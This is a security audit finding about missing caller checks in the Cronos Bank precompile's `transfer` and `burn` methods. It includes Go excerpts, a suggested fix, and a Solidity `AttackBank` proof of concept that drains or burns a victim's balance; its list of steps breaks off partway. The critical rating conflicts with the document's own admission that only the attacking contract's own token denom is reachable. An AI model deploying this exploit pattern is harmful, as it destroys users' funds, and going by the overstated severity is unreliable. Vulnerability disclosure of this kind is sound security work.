### Title
Missing Caller Authorization in `BankContract::transfer` and `BankContract::burn` Allows Any Contract to Drain or Destroy Any User's Native Bank Tokens - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The Bank precompile's `transfer` and `burn` methods accept an arbitrary address as the token-owner argument but never verify that `contract.Caller()` (the EVM `msg.sender`) equals that address. Any EVM contract can therefore drain or destroy another account's native Cosmos bank coins of denom `evm/<calling_contract_address>` without the owner's consent.

### Finding Description

The Bank precompile (`BankContract`) at address `0x0000000000000000000000000000000000000064` exposes four methods: `mint`, `burn`, `balanceOf`, and `transfer`. The denom for all operations is computed as `EVMDenom(contract.Caller())` — i.e., `evm/<calling_contract_address>` — so the calling contract is the implicit "issuer" of its own native token.

**`transfer` (lines 167–200):**

```go
sender    := args[0].(common.Address)   // taken from calldata
recipient := args[1].(common.Address)
// ...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())    // evm/<calling_contract>
// NO check: contract.Caller() == sender
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

The `from` account is taken directly from the calldata argument, not from `contract.Caller()`. There is no guard requiring `contract.Caller() == sender`.

**`burn` (lines 113–156, shared branch):**

```go
recipient := args[0].(common.Address)   // address to burn FROM
addr := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())
// NO check: contract.Caller() == recipient
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

Again, the address whose tokens are burned is taken from calldata with no caller-identity check.

This is the direct analog of the external report: `SecuritizeSwap::buy` accepted `_senderInvestorId` / `_investorWallet` as parameters and verified the investor was registered, but never checked `msg.sender == investor(_senderInvestorId)`. Here, the Bank precompile verifies the denom (via `contract.Caller()`) but never checks that the caller is authorized to spend the `sender` argument's balance.

### Impact Explanation

**Critical — Unauthorized transfer and burn of native bank assets.**

Any user who holds `evm/<contract_address>` tokens in the Cosmos bank module (acquired by calling `bank.mint` through a legitimate contract, as shown in `TestBank.sol`'s `moveToNative` flow) is fully exposed. A malicious contract can:

1. Call `bank.transfer(victim, attacker, victim_balance)` → drains all of victim's `evm/<contract_address>` native coins to the attacker with no approval.
2. Call `bank.burn(victim, victim_balance)` → permanently destroys victim's native coins.

These are irreversible, unprivileged, and require no leaked keys or governance action.

### Likelihood Explanation

The `evm/<contract_address>` denom is the intended mechanism for EVM contracts to back native Cosmos bank tokens (documented in `TestBank.sol` and `adr-004.md`). Any contract that has minted native tokens to users creates a pool of victims. A single malicious contract deployed by any unprivileged actor can exploit this immediately.

### Recommendation

In the `transfer` case, require that the EVM caller is the token owner:

```go
if contract.Caller() != sender {
    return nil, errors.New("caller is not authorized to transfer from sender")
}
```

In the `burn` case, require that the EVM caller is the address being burned:

```go
if contract.Caller() != recipient {
    return nil, errors.New("caller is not authorized to burn from address")
}
```

Alternatively, redesign `transfer` to always use `contract.Caller()` as the `from` address (matching the ERC-20 `transfer` semantics), and provide a separate `transferFrom` that requires an explicit allowance.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function balanceOf(address, address) external view returns (uint256);
}

contract AttackBank {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: victim previously called a legitimate contract that called
    //         bank.mint(victim, 1000), giving victim 1000 evm/<legitimate_contract> tokens.
    //
    // Step 2: attacker deploys THIS contract and calls drain().
    //         Because denom = evm/<this_contract>, this only works against
    //         evm/<this_contract> balances — but if this contract also has a
    //         mint path used by users, those users are fully drained.

    function drain(address victim, address attacker) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        // No authorization check in the precompile — succeeds unconditionally
        bank.transfer(victim, attacker, bal);
    }

    function destroy(address victim) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        // Burns victim's tokens without their consent
        bank.burn(victim, bal);
    }
}
```

1. Attacker deploys `AttackBank` at address `0xATK`.
2. Users interact with `AttackBank` (e.g., via a `moveToNative`-style function), acquiring `evm/0xATK` native bank balances.
